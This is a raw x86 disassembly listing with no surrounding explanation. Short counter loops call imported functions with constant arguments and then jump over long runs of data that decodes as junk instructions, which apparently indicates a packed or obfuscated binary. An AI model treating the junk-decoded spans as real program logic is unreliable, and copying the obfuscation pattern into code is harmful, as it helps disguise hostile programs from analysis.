  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    edi,DWORD PTR [esi]
  4127be:	retf   0xf60e
  4127c1:	enter  0x7059,0x70
  4127c5:	mov    ecx,0x2970707e
  4127ca:	cmp    DWORD PTR [edi+esi*8+0x38eac531],edi
  4127d1:	mov    ebx,0x56502d62
  4127d6:	mov    eax,ds:0x852b6912
  4127db:	fsubrp st(2),st
  4127dd:	sbb    eax,0xb9687155
  4127e2:	push   edx
  4127e3:	fwait
  4127e4:	pop    esp
  4127e5:	push   cs
  4127e6:	dec    edx
  4127e7:	popa   
  4127e8:	jge    0x4127cf
  4127ea:	dec    ecx
  4127eb:	xor    eax,0x1ac9c00a
  4127f0:	push   0x2d
  4127f2:	cs mov esp,0x8421f467
  4127f8:	hlt    
  4127f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127fa:	inc    ebp
  4127fb:	(bad)  
  4127fc:	fild   DWORD PTR [esi+0x78]
  4127ff:	fistp  QWORD PTR [esi-0x3be5f42f]
  412805:	adc    eax,0xb2a55ebf
  41280a:	ss and eax,0xb4aec280
  412810:	adc    cl,cl
  412812:	int    0x8a
  412814:	test   al,0x3c
  412816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412817:	or     cl,bl
  412819:	push   0x13
  41281b:	mov    eax,ds:0xb3a33df4
  412820:	cmp    BYTE PTR [edi+0x3bc7defa],0x50
  412827:	push   cs
  412828:	xor    eax,0xfe8b5b45
  41282d:	loope  0x4127ed
  41282f:	mov    al,ds:0xe8a9623c
  412834:	test   al,0x20
  412836:	popf   
  412837:	dec    esp
  412838:	test   bl,ch
  41283a:	enter  0x9524,0xa5
  41283e:	xor    BYTE PTR [esi+0x1b],0xbc
  412842:	outs   dx,DWORD PTR ds:[esi]
  412843:	or     esp,DWORD PTR [esi]
  412845:	sub    eax,0xf05e9561
  41284a:	aas    
  41284b:	cmp    al,BYTE PTR [ebx+0x1b]
  41284e:	mov    BYTE PTR [edi-0x2c3e3e46],ch
  412854:	xor    eax,0xc16f804a
  412859:	mov    ds:0x112fe360,al
  41285e:	cli    
  41285f:	push   edx
  412860:	ss inc ebp
  412862:	sbb    edx,DWORD PTR [esi+0xa77ccd1]
  412868:	test   ebp,ebp
  41286a:	ret    0x8cfc
  41286d:	rol    BYTE PTR [eax],0x58
  412870:	outs   dx,DWORD PTR ds:[esi]
  412871:	xchg   ebp,eax
  412872:	outs   dx,DWORD PTR ds:[esi]
  412873:	popf   
  412874:	(bad)  
  412876:	test   bh,ah
  412878:	lahf   
  412879:	inc    ecx
  41287a:	ins    DWORD PTR es:[edi],dx
  41287b:	dec    ebp
  41287c:	popa   
  41287d:	les    ebp,FWORD PTR [eax+ebx*1]
  412880:	add    DWORD PTR [ebx],ebx
  412882:	jno    0x4128d5
  412884:	loopne 0x4128e7
  412886:	sbb    BYTE PTR [ebp-0x1a],dh
  412889:	cmp    eax,0xb1c973c6
  41288e:	loop   0x41289c
  412890:	je     0x41290a
  412892:	retf   0xd431
  412895:	mov    al,0x5f
  412897:	retf   0xd71b
  41289a:	fs cs jne 0x412871
  41289e:	cwde   
  41289f:	pop    ebx
  4128a0:	push   0xf
  4128a2:	sahf   
  4128a3:	dec    eax
  4128a4:	mov    ebp,DWORD PTR [edi+0x1023ce45]
  4128aa:	or     esi,0xffffffee
  4128ad:	jo     0x4128c5
  4128af:	inc    edi
  4128b0:	mov    bl,0x9b
  4128b2:	loope  0x41291f
  4128b4:	mov    al,ds:0x8cbf4d7f
  4128b9:	std    
  4128ba:	sbb    ah,cl
  4128bc:	dec    ebx
  4128bd:	xor    bl,al
  4128bf:	pop    ebx
  4128c0:	and    DWORD PTR [ecx+0x45b89483],0xc868240f
  4128ca:	fstp   DWORD PTR [edx+0x6]
  4128cd:	(bad)  
  4128ce:	cmp    ch,ah
  4128d0:	add    eax,ecx
  4128d2:	call   0x9bd8:0x5127818c
  4128d9:	adc    BYTE PTR [ebp+0x73],dl
  4128dc:	mov    dl,0xf1
  4128de:	lea    esp,[eax]
  4128e0:	leave  
  4128e1:	inc    ebp
  4128e2:	shr    esi,cl
  4128e4:	rol    DWORD PTR [edi-0x53dbfda0],1
  4128ea:	inc    ecx
  4128eb:	int    0x49
  4128ed:	mov    bl,0xf
  4128ef:	fidiv  DWORD PTR [edx+0x744cfdb7]
  4128f5:	xchg   edx,eax
  4128f6:	nop
  4128f7:	jg     0x412950
  4128f9:	outs   dx,BYTE PTR ds:[esi]
  4128fa:	push   ss
  4128fb:	inc    eax
  4128fc:	adc    al,0x11
  4128fe:	into   
  4128ff:	add    al,BYTE PTR [edi+0x7bb40646]
  412905:	sbb    esi,esp
  412907:	xchg   esi,eax
  412908:	(bad)  
  41290a:	mov    cl,0xce
  41290c:	lods   eax,DWORD PTR ds:[esi]
  41290d:	xchg   DWORD PTR [edx-0x21],esp
  412910:	(bad)  
  412912:	gs and al,0xe
  412915:	xor    DWORD PTR [edx+0x47d9e779],ebp
  41291b:	mov    BYTE PTR [ecx+ebp*2],bh
  41291e:	or     DWORD PTR [ecx+0x78],edx
  412921:	(bad)  
  412922:	adc    DWORD PTR [edi+0x2e0f0366],esi
  412928:	outs   dx,BYTE PTR ds:[esi]
  412929:	ja     0x412930
  41292b:	sar    ecx,1
  41292d:	or     cl,BYTE PTR ds:0x7321e8a7
  412933:	mov    ebp,0xa5882bed
  412938:	sub    BYTE PTR [edi-0x72],0x6b
  41293c:	out    0x56,al
  41293e:	jle    0x412922
  412940:	shl    BYTE PTR [edx-0x6deca70b],1
  412946:	pop    es
  412947:	aas    
  412948:	std    
  412949:	mov    eax,ds:0x7033cfd
  41294e:	cld    
  41294f:	dec    ecx
  412950:	push   edi
  412951:	pop    edi
  412952:	adc    al,0xdf
  412954:	test   DWORD PTR [ecx-0x6d],edx
  412957:	mov    ?,WORD PTR [ecx+edx*8+0x40]
  41295b:	retf   0x53f6
  41295e:	out    0xc,eax
  412960:	pop    esp
  412961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412962:	sbb    al,0x15
  412964:	sbb    eax,0xeb2d68b8
  412969:	mov    dl,0xe4
  41296b:	xchg   ecx,eax
  41296c:	dec    esi
  41296d:	push   es
  41296e:	mov    ds:0xabde6a4e,eax
  412973:	jnp    0x41294e
  412975:	mov    al,ds:0xf0060fbc
  41297a:	pminsw mm6,QWORD PTR [esi-0x18a5b3f8]
  412981:	fiadd  WORD PTR ds:0xbb65baa0
  412987:	sub    ebp,ecx
  412989:	xchg   ebx,eax
  41298a:	adc    DWORD PTR [ecx],ebp
  41298c:	shl    BYTE PTR [eax],1
  41298e:	xchg   ecx,eax
  41298f:	cmp    al,0x9b
  412991:	(bad)  
  412992:	mov    esp,0x3a7e72d0
  412997:	stc    
  412998:	inc    esi
  412999:	sub    eax,0xc6b1e138
  41299e:	xchg   esp,eax
  41299f:	sbb    eax,0x5bd129a8
  4129a4:	mov    al,0x60
  4129a6:	or     BYTE PTR [ebx-0x392028cc],bl
  4129ac:	mov    ch,ch
  4129ae:	xchg   esp,eax
  4129af:	into   
  4129b0:	pushf  
  4129b1:	xor    ebp,ecx
  4129b3:	jb     0x4129ba
  4129b5:	pop    eax
  4129b6:	in     eax,dx
  4129b7:	(bad)  
  4129b8:	mov    eax,ds:0x13ad0b1d
  4129bd:	xchg   DWORD PTR [esi],esp
  4129bf:	cmp    edi,DWORD PTR [edx]
  4129c1:	rcl    ebx,0x3f
  4129c4:	cmp    al,0x6c
  4129c6:	xchg   edx,eax
  4129c7:	push   0x36
  4129c9:	push   edx
  4129ca:	fcomp  DWORD PTR [esi+0x5f132823]
  4129d0:	push   es
  4129d1:	imul   ecx,DWORD PTR [esi-0x38],0x25cff574
  4129d8:	js     0x41296a
  4129da:	ins    DWORD PTR es:[edi],dx
  4129db:	sbb    ch,ch
  4129dd:	inc    ebx
  4129de:	mov    edx,DWORD PTR [esi+0x3ceeca44]
  4129e4:	lea    ecx,[edx+0x69]
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	mov    esi,0xb15bde7
  4129ed:	jle    0x4129e4
  4129ef:	div    DWORD PTR [esi+edx*4+0x57]
  4129f3:	adc    BYTE PTR [ecx],dl
  4129f5:	fcom   DWORD PTR [ecx]
  4129f7:	adc    al,0x33
  4129f9:	sub    ebp,DWORD PTR [eax-0x63566aec]
  4129ff:	imul   ebp,DWORD PTR [ecx],0xffffffde
  412a02:	jecxz  0x412a27
  412a04:	outs   dx,BYTE PTR ds:[esi]
  412a05:	jge    0x412a68
  412a07:	push   ebp
  412a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a09:	aad    0xdd
  412a0b:	sub    al,0x12
  412a0d:	das    
  412a0e:	push   es
  412a0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a10:	ins    BYTE PTR es:[edi],dx
  412a11:	adc    DWORD PTR es:[esi+0x31e18677],eax
  412a18:	mov    WORD PTR [ecx],fs
  412a1a:	xchg   edx,eax
  412a1b:	dec    esi
  412a1c:	fsubr  DWORD PTR [edx-0x5e]
  412a1f:	xchg   esp,eax
  412a20:	sar    BYTE PTR [edx+0x2fe727d1],cl
  412a26:	mov    ?,ebx
  412a28:	out    0xad,al
  412a2a:	daa    
  412a2b:	and    al,BYTE PTR [ebx]
  412a2d:	shl    DWORD PTR [esi],0x73
  412a30:	xchg   esi,eax
  412a31:	leave  
  412a32:	xchg   edx,eax
  412a33:	inc    BYTE PTR [ebp-0x1e568ca4]
  412a39:	adc    eax,0x5e38a96c
  412a3e:	les    esi,FWORD PTR [edx]
  412a40:	jp     0x412a8a
  412a42:	fstp   TBYTE PTR [edi]
  412a44:	pusha  
  412a45:	popa   
  412a46:	and    dl,0x19
  412a49:	and    ch,dl
  412a4b:	aaa    
  412a4c:	rcl    DWORD PTR [ebx+ecx*8],cl
  412a4f:	or     ch,BYTE PTR [ebp+0x362db413]
  412a55:	or     eax,0x2adac3a7
  412a5a:	gs cwde 
  412a5c:	fisub  DWORD PTR [edx+0x0]
  412a5f:	inc    ebx
  412a60:	jnp    0x412a64
  412a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a63:	fdivr  st,st(1)
  412a65:	outs   dx,DWORD PTR ds:[esi]
  412a66:	dec    edx
  412a67:	or     al,0xa5
  412a69:	inc    esp
  412a6a:	pop    esi
  412a6b:	hlt    
  412a6c:	and    ebx,DWORD PTR [esi+0x18]
  412a6f:	icebp  
  412a70:	jb     0x412aed
  412a72:	jae    0x412a9a
  412a74:	shl    DWORD PTR [esi],1
  412a76:	xchg   BYTE PTR [eax+0x13],ah
  412a79:	pusha  
  412a7a:	lock sti 
  412a7c:	repz inc BYTE PTR [eax+0x54392dfe]
  412a83:	inc    ebp
  412a84:	and    al,0xf4
  412a86:	iret   
  412a87:	push   ss
  412a88:	cmp    bl,ch
  412a8a:	stc    
  412a8b:	mov    eax,ds:0xf7a56ea7
  412a90:	je     0x412aa6
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e120
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fcf5,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fcf5,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412afd
  412b3b:	idiv   BYTE PTR [ebp+0x4]
  412b3e:	adc    DWORD PTR [esi+0x70],esp
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412b9f
  412b47:	(bad)  
  412b48:	jp     0x412b0b
  412b4a:	(bad)  [esi]
  412b4c:	fnstsw WORD PTR [eax-0x69]
  412b4f:	(bad)  
  412b50:	stc    
  412b51:	sbb    esi,0xffffff8e
  412b54:	mov    eax,0x5eff09a8
  412b59:	cdq    
  412b5a:	lods   eax,DWORD PTR ds:[esi]
  412b5b:	retf   0x1d8a
  412b5e:	jle    0x412b39
  412b60:	mov    edi,0x7a216ad8
  412b65:	and    esp,DWORD PTR [edi]
  412b67:	retf   
  412b68:	add    ax,0x4d03
  412b6c:	sub    ch,0xf4
  412b6f:	sbb    dh,BYTE PTR [esi]
  412b71:	mov    ds:0x91da0422,eax
  412b76:	loopne 0x412be3
  412b78:	and    eax,0xe8e5c38c
  412b7d:	jmp    0x412b9e
  412b7f:	sbb    al,0xcf
  412b81:	xor    DWORD PTR [ebx],edx
  412b83:	xor    BYTE PTR [ebx-0x980c80b],ch
  412b89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b8a:	mov    al,ds:0x52a30dc5
  412b8f:	nop
  412b90:	stc    
  412b91:	sub    al,0xa2
  412b93:	pushf  
  412b94:	jge    0x412be8
  412b96:	sbb    BYTE PTR [ecx-0x40],bh
  412b99:	inc    ecx
  412b9a:	and    DWORD PTR [edx+0x3f688116],0xffffffa9
  412ba1:	dec    esp
  412ba2:	bnd jge 0x412c0a
  412ba5:	xchg   edx,eax
  412ba6:	xor    BYTE PTR [ecx-0x75f953a3],bl
  412bac:	dec    eax
  412bad:	fidivr DWORD PTR [eax-0x2d]
  412bb0:	(bad)  
  412bb1:	dec    ebx
  412bb2:	sti    
  412bb3:	add    esi,DWORD PTR [ebx-0xd125518]
  412bb9:	stos   DWORD PTR es:[edi],eax
  412bba:	sbb    ch,BYTE PTR [eax]
  412bbc:	mov    eax,ds:0x93b240ef
  412bc1:	ss retf 
  412bc3:	cld    
  412bc4:	inc    dl
  412bc6:	cmp    ecx,DWORD PTR [edi-0x3c27fd5e]
  412bcc:	cmp    ah,al
  412bce:	or     al,0xae
  412bd0:	es inc edi
  412bd2:	push   edx
  412bd3:	test   bh,bh
  412bd5:	out    dx,eax
  412bd6:	sub    DWORD PTR [eax+0x56ec7984],0xd537a77f
  412be0:	jecxz  0x412c26
  412be2:	sbb    BYTE PTR [ebp+0x69f77393],bh
  412be8:	aas    
  412be9:	jns    0x412c58
  412beb:	xor    edx,eax
  412bed:	mov    ebx,0x85b43b1
  412bf2:	mov    dh,0xe0
  412bf4:	out    0xa3,al
  412bf6:	xchg   ecx,ebx
  412bf8:	out    0x94,al
  412bfa:	sbb    eax,0x3b8157f2
  412bff:	xor    eax,0x8ce3a0b8
  412c04:	test   DWORD PTR [edx],eax
  412c06:	es mov al,0xdc
  412c09:	(bad)  
  412c0a:	xchg   ebp,eax
  412c0b:	(bad)  
  412c0c:	inc    ecx
  412c0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c0e:	sub    BYTE PTR fs:[edi+0x7c95e9ae],ch
  412c15:	mov    ch,0x6
  412c17:	mov    ds:0x957bcc95,eax
  412c1c:	loopne 0x412c36
  412c1e:	xor    edi,DWORD PTR [edx-0x77734cbd]
  412c24:	push   ss
  412c25:	jge    0x412bb7
  412c27:	and    eax,0xf2aeaef0
  412c2c:	out    dx,al
  412c2d:	gs pop edx
  412c2f:	ficomp DWORD PTR [eax]
  412c31:	xor    dl,BYTE PTR [ebp-0x500a46c6]
  412c37:	xor    esi,DWORD PTR [ecx+ebx*2]
  412c3a:	dec    ecx
  412c3b:	mov    bl,0xdf
  412c3d:	rol    DWORD PTR [ebp-0x2e],1
  412c40:	(bad)  
  412c41:	pop    eax
  412c42:	jno    0x412c27
  412c44:	loope  0x412bfb
  412c46:	out    dx,al
  412c47:	push   esi
  412c48:	ins    BYTE PTR es:[edi],dx
  412c49:	mov    cl,0x5d
  412c4b:	dec    eax
  412c4c:	hlt    
  412c4d:	ret    0xa27c
  412c50:	sbb    eax,DWORD PTR [esi-0x79c132aa]
  412c56:	push   esp
  412c57:	xchg   edx,eax
  412c58:	cdq    
  412c59:	jnp    0x412c64
  412c5b:	fistp  QWORD PTR [ebp+edi*4-0x709abc93]
  412c62:	mov    dl,0x4
  412c64:	jge    0x412c58
  412c66:	add    BYTE PTR [ebx+edi*4-0x6b721d56],0x8b
  412c6e:	fs into 
  412c70:	cmp    al,0xb1
  412c72:	or     BYTE PTR [edx],dl
  412c74:	pop    ss
  412c75:	push   ss
  412c76:	push   ss
  412c77:	imul   edx,DWORD PTR [esi+0x4c],0xfffffff7
  412c7b:	push   eax
  412c7c:	pop    eax
  412c7d:	rcr    DWORD PTR [edi-0x50187b02],0xd8
  412c84:	mov    dl,BYTE PTR [eax-0x476efc90]
  412c8a:	or     BYTE PTR [ecx-0x1d],0x68
  412c8e:	dec    eax
  412c8f:	enter  0x167f,0x58
  412c93:	push   ss
  412c94:	call   0x98e4:0x9488a3d9
  412c9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c9c:	mov    ebp,0xbb9cfae
  412ca1:	out    0xa0,eax
  412ca3:	jbe    0x412ccc
  412ca5:	int    0x15
  412ca7:	mov    esi,0x3de24029
  412cac:	or     eax,0xc72611b1
  412cb1:	inc    esp
  412cb2:	sbb    esi,DWORD PTR [eax-0x3f]
  412cb5:	addr16 aad 0x9d
  412cb8:	and    esp,DWORD PTR [esi-0xf43c60a]
  412cbe:	outs   dx,DWORD PTR ds:[esi]
  412cbf:	jns    0x412c5f
  412cc1:	xor    ch,BYTE PTR [edi]
  412cc3:	gs pushf 
  412cc5:	lods   al,BYTE PTR ds:[esi]
  412cc6:	add    al,0xaf
  412cc8:	sbb    ch,dl
  412cca:	js     0x412d06
  412ccc:	arpl   WORD PTR [esi+0x61],cx
  412ccf:	retf   0x46a3
  412cd2:	jge    0x412d17
  412cd4:	jp     0x412d28
  412cd6:	jmp    0xfbe:0xbc9c80fb
  412cdd:	push   ecx
  412cde:	push   0x5e2e0ced
  412ce3:	lock sub edx,DWORD PTR [esp+eax*2]
  412ce7:	test   eax,0x1ce57559
  412cec:	dec    edx
  412ced:	mov    esp,0x5188c250
  412cf2:	add    bh,BYTE PTR [edi+0x15]
  412cf5:	outs   dx,BYTE PTR ds:[esi]
  412cf6:	imul   DWORD PTR [esi]
  412cf8:	or     al,0xbd
  412cfa:	or     esp,DWORD PTR [edx-0x21a06cfc]
  412d00:	pop    eax
  412d01:	add    esp,edx
  412d03:	popf   
  412d04:	(bad)  
  412d05:	pop    edi
  412d06:	jns    0x412cef
  412d08:	int    0x2b
  412d0a:	mov    ds:0x433d2849,eax
  412d0f:	push   0x62dc7301
  412d14:	out    dx,al
  412d15:	call   0x1fd2c210
  412d1a:	mov    ds:0xbbfdfc12,al
  412d1f:	(bad)  
  412d20:	in     eax,0x9c
  412d22:	jg     0x412d35
  412d24:	dec    eax
  412d25:	and    esi,ecx
  412d27:	pop    ebp
  412d28:	push   ebp
  412d29:	and    eax,0x3b3e5a2c
  412d2e:	adc    dh,BYTE PTR [esi-0x5656be81]
  412d34:	fadd   DWORD PTR [edi-0xf23a8c6]
  412d3a:	rcl    DWORD PTR [esi+0x4d693f78],0x85
  412d41:	and    ch,BYTE PTR [ecx]
  412d43:	arpl   WORD PTR [edx-0x278b7a9f],sp
  412d49:	pop    ebx
  412d4a:	into   
  412d4b:	push   ebx
  412d4c:	repz push esp
  412d4e:	inc    esi
  412d4f:	ja     0x412dae
  412d51:	out    0x5e,al
  412d53:	push   ds
  412d54:	mov    al,0x2f
  412d56:	sti    
  412d57:	sub    BYTE PTR [edx],bl
  412d59:	or     al,0xb6
  412d5b:	jo     0x412d2a
  412d5d:	jmp    0x98a7:0x2c0cdad3
  412d64:	js     0x412de3
  412d66:	ret    
  412d67:	in     eax,0x43
  412d69:	xchg   esp,eax
  412d6a:	xor    cl,dl
  412d6c:	sub    eax,0x72135ed0
  412d71:	out    dx,eax
  412d72:	sbb    cl,BYTE PTR ds:0xeb50193c
  412d78:	adc    BYTE PTR [ebx-0x3e],dl
  412d7b:	(bad)  
  412d7c:	jns    0x412d25
  412d7e:	pusha  
  412d7f:	(bad)  
  412d80:	or     bl,ah
  412d82:	outs   dx,BYTE PTR ds:[esi]
  412d83:	pop    ecx
  412d84:	dec    eax
  412d85:	in     eax,0x35
  412d87:	push   esp
  412d88:	sbb    ecx,DWORD PTR [eax-0x79]
  412d8b:	call   0x337b:0xd842fa53
  412d92:	mov    DWORD PTR [edi-0xd],ebp
  412d95:	mov    WORD PTR [ebx-0x4],cs
  412d98:	cmp    dh,dl
  412d9a:	retf   0x2982
  412d9d:	xor    ch,BYTE PTR [edx+0x58]
  412da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412da1:	fdiv   QWORD PTR [eax-0x7dee9d19]
  412da7:	pop    esi
  412da8:	inc    esi
  412da9:	dec    ebx
  412daa:	mov    eax,0xee651cf7
  412daf:	jns    0x412dc0
  412db1:	push   ss
  412db2:	cmc    
  412db3:	push   ebp
  412db4:	cmp    BYTE PTR [edi-0x631fbe6e],dh
  412dba:	inc    edi
  412dbb:	mov    edx,0x12134336
  412dc0:	pop    esp
  412dc1:	(bad)  
  412dc2:	retf   0x854b
  412dc5:	xor    esp,ebp
  412dc7:	fdiv   QWORD PTR [eax-0x10]
  412dca:	das    
  412dcb:	pop    ebp
  412dcc:	call   DWORD PTR [edx+edi*4+0x2f]
  412dd0:	ja     0x412db9
  412dd2:	dec    esp
  412dd3:	cmp    al,0xac
  412dd5:	cmp    al,0x6
  412dd7:	inc    ebp
  412dd8:	mov    ds:0x60386164,al
  412ddd:	push   cs
  412dde:	xor    al,0xf2
  412de0:	scas   eax,DWORD PTR es:[edi]
  412de1:	je     0x412de9
  412de3:	pop    ds
  412de4:	cmp    DWORD PTR [edi+0x23931e4f],eax
  412dea:	ja     0x412e0e
  412dec:	call   0xcdad:0x576849fe
  412df3:	jnp    0x412d77
  412df5:	out    dx,eax
  412df6:	in     eax,0x1d
  412df8:	dec    ebp
  412df9:	out    0x58,eax
  412dfb:	mov    esi,esi
  412dfd:	inc    ebp
  412dfe:	jle    0x412d93
  412e00:	(bad)  
  412e01:	in     al,dx
  412e02:	(bad)  
  412e03:	xor    bl,BYTE PTR [eax+0x609d641a]
  412e09:	push   ecx
  412e0a:	cmp    eax,DWORD PTR [ebx]
  412e0c:	xchg   DWORD PTR [edi+0x1c2581ce],eax
  412e12:	loope  0x412e56
  412e14:	add    BYTE PTR [eax],al
  412e16:	add    BYTE PTR [eax],al
  412e18:	add    cl,ch
  412e1a:	sldt   WORD PTR [eax]
  412e1d:	add    BYTE PTR [ebx],dh
  412e1f:	leave  
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [ecx-0x30],bp
  412e77:	gs or  al,0x5a
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0xeb70707e
  412e82:	ja     0x412ea2
  412e84:	shl    DWORD PTR [ebx],1
  412e86:	shl    DWORD PTR ds:0xf288012e,1
  412e8c:	or     edi,eax
  412e8e:	inc    ebx
  412e8f:	loopne 0x412ebd
  412e91:	sbb    al,0xb3
  412e93:	lods   eax,DWORD PTR ds:[esi]
  412e94:	add    al,0xa3
  412e96:	sbb    bh,BYTE PTR [ecx]
  412e98:	sbb    eax,0x51af6390
  412e9d:	dec    edi
  412e9e:	rcr    al,0x50
  412ea1:	stos   DWORD PTR es:[edi],eax
  412ea2:	pop    eax
  412ea3:	adc    esi,esi
  412ea5:	push   0xcd2577d3
  412eaa:	bound  ebx,QWORD PTR [ecx-0x33]
  412ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eae:	and    ch,bh
  412eb0:	mov    al,ds:0x702ae279
  412eb5:	push   0x1a967fab
  412eba:	fist   DWORD PTR [esi-0x46]
  412ebd:	jmp    0x412e9b
  412ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ec0:	(bad)  
  412ec1:	xor    esp,ecx
  412ec3:	cdq    
  412ec4:	test   eax,0x1ff23305
  412ec9:	loope  0x412ecb
  412ecb:	inc    ebp
  412ecc:	ret    
  412ecd:	scas   al,BYTE PTR es:[edi]
  412ece:	fwait
  412ecf:	and    esi,DWORD PTR [eax]
  412ed1:	mov    cl,0x1d
  412ed3:	adc    BYTE PTR [esi-0x455c1ce9],ah
  412ed9:	xchg   ebx,eax
  412eda:	sar    BYTE PTR [ecx-0x74],0x36
  412ede:	jmp    0xd477f1fb
  412ee3:	call   0x8f806e7b
  412ee8:	jns    0x412f67
  412eea:	sub    dh,ch
  412eec:	std    
  412eed:	or     BYTE PTR [edx+0x1f6ef735],dl
  412ef3:	fnsave [eax+ebx*4-0x80]
  412ef7:	push   edx
  412ef8:	xchg   ebx,eax
  412ef9:	mov    edi,0xdc17c981
  412efe:	mov    edx,0xa16b5b64
  412f03:	ret    0xd379
  412f06:	push   0x3b90ae37
  412f0b:	jo     0x412ec7
  412f0d:	push   edi
  412f0e:	push   edi
  412f0f:	dec    edx
  412f10:	outs   dx,BYTE PTR ds:[esi]
  412f11:	sub    BYTE PTR [esp+ebx*1],0xc7
  412f15:	in     eax,0xf1
  412f17:	ja     0x412eff
  412f19:	out    dx,eax
  412f1a:	inc    esp
  412f1b:	pop    es
  412f1c:	pop    ecx
  412f1d:	cmp    DWORD PTR [esp],ebp
  412f20:	adc    al,0x7
  412f22:	inc    esp
  412f23:	or     eax,0x7f05cc68
  412f28:	sub    BYTE PTR [edx-0x2d5bb02e],0xc5
  412f2f:	and    BYTE PTR [edi+0x20fcaa4a],cl
  412f35:	in     al,0xac
  412f37:	fstp   TBYTE PTR [edx-0x4e]
  412f3a:	std    
  412f3b:	or     DWORD PTR [ebp-0x70],0xd29dd9c
  412f42:	in     al,0x4c
  412f44:	dec    esi
  412f45:	sbb    dl,bl
  412f47:	in     al,0xd
  412f49:	repz cmp eax,0xce56e46d
  412f4f:	xlat   BYTE PTR ds:[ebx]
  412f50:	jp     0x412f90
  412f52:	xor    BYTE PTR [ecx-0x5c],0x3d
  412f56:	mov    eax,0x61bceee0
  412f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f5c:	int3   
  412f5d:	dec    ecx
  412f5e:	xor    BYTE PTR [edx],bl
  412f60:	xchg   edi,eax
  412f61:	xchg   DWORD PTR [edi+ebp*4],esp
  412f64:	add    DWORD PTR [ebp+0xc],0xffffffbb
  412f68:	pop    ss
  412f69:	sub    eax,0xa7e66290
  412f6e:	adc    BYTE PTR [esi+edi*8],0xb8
  412f72:	mov    ch,0xeb
  412f74:	stos   BYTE PTR es:[edi],al
  412f75:	pop    es
  412f76:	dec    ebp
  412f77:	sbb    eax,0xc6b50212
  412f7c:	loopne 0x412f06
  412f7e:	push   eax
  412f7f:	sub    ebp,DWORD PTR [esi]
  412f81:	ds push ss
  412f83:	cmc    
  412f84:	arpl   WORD PTR gs:[esi],bp
  412f87:	test   DWORD PTR [ebp+0x479a4d0b],ecx
  412f8d:	dec    eax
  412f8e:	mov    edx,0x5e90811
  412f93:	push   ss
  412f94:	mov    al,0xa1
